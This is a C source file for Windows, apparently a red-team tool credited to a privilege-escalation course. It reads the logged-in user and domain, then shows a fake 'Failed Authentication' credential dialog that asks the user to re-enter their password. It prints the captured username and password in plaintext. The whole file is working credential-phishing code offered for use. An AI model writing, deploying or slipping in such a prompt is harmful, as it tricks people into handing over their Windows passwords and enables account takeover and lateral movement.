#include <stdio.h>
#include <windows.h>
#include <wincred.h>
#include <tchar.h>

#pragma comment(lib, "Credui.lib")
#pragma comment(lib, "advapi32.lib")

// Credits to reenz0h (twitter: @sektor7net), who initialy implemented this technique using Powershell.
// Please check out Sektor7 "RED TEAM Operator: Privilege Escalation in Windows course" where this technique is described:
// https://institute.sektor7.net/rto-lpe-windows

// Function skidded from:
// https://stackoverflow.com/questions/24968541/how-to-get-the-domain-of-currently-logged-on-user-in-windows
BOOL GetCurrentUserAndDomain(PTSTR szUser, PDWORD pcchUser, PTSTR szDomain, PDWORD pcchDomain) {
    BOOL success = FALSE;
    HANDLE hToken = NULL;
    PTOKEN_USER ptiUser = NULL;
    DWORD cbti = 0;
    SID_NAME_USE snu;

    // Get the calling thread's access token.
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &hToken)) {
        if (GetLastError() != ERROR_NO_TOKEN)
            return success;

        // Retry against process token if no thread token exists.
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
            return success;
    }

    // Obtain the size of the user information in the token.
    if (GetTokenInformation(hToken, TokenUser, NULL, 0, &cbti)) {
        // Call should have failed due to zero-length buffer.
        return success;
    } else{
        // Call should have failed due to zero-length buffer.
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
            return success;
    }

    // Allocate buffer for user information in the token.
    ptiUser = (PTOKEN_USER) HeapAlloc(GetProcessHeap(), 0, cbti);
    if (!ptiUser)
        return success;

    // Retrieve the user information from the token.
    if (!GetTokenInformation(hToken, TokenUser, ptiUser, cbti, &cbti))
        return success;

    // Retrieve user name and domain name based on user's SID.
    if (!LookupAccountSid(NULL, ptiUser->User.Sid, szUser, pcchUser, szDomain, pcchDomain, &snu))
        return success;

    success = TRUE;

    // Free resources.
    if (hToken)
        CloseHandle(hToken);
    HeapFree(GetProcessHeap(), 0, ptiUser);

    return success;
}

int main() {
    CREDUI_INFO cui;
    TCHAR pszName[CREDUI_MAX_USERNAME_LENGTH+1];
    TCHAR pszPwd[CREDUI_MAX_PASSWORD_LENGTH+1];
    TCHAR user[1024], domain[1024];
    BOOL fSave;
    DWORD dwErr;

    cui.cbSize = sizeof(CREDUI_INFO);
    cui.hwndParent = NULL;

    cui.pszMessageText = TEXT("Enter your credentials.");
    cui.pszCaptionText = TEXT("Failed Authentication");
    cui.hbmBanner = NULL;
    fSave = TRUE;
    SecureZeroMemory(pszName, sizeof(pszName));
    SecureZeroMemory(pszPwd, sizeof(pszPwd));


    // Get username and domain
    DWORD chUser = sizeof(user), chDomain = sizeof(domain);
    if (GetCurrentUserAndDomain(user, &chUser, domain, &chDomain)){
        sprintf(pszName, "%s\\%s", domain, user);

        dwErr = CredUIPromptForCredentials(
                &cui,
                TEXT("someserver"),
                NULL,
                0,
                pszName,
                CREDUI_MAX_USERNAME_LENGTH+1,
                pszPwd,
                CREDUI_MAX_PASSWORD_LENGTH+1,
                &fSave,
                CREDUI_FLAGS_GENERIC_CREDENTIALS | CREDUI_FLAGS_ALWAYS_SHOW_UI);

        if(!dwErr){
            //  Put code that uses the credentials here.
            _tprintf(TEXT("Username: %s\n"), pszName);
            _tprintf(TEXT("Password: %s\n"), pszPwd);


            SecureZeroMemory(pszName, sizeof(pszName));
            SecureZeroMemory(pszPwd, sizeof(pszPwd));
        }
    }

    printf("\nPress enter to exit.\n");
    getchar();
    return 0;
}
